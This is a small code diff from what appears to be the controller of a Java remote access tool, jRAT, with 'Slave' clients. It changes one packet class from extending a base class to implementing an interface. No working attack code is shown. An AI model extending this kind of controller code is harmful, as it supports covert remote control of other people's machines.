@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet41SpecialDirectory extends AbstractOutgoingPacket {
+public class Packet41SpecialDirectory implements OutgoingPacket {
 
 	private int location;
 
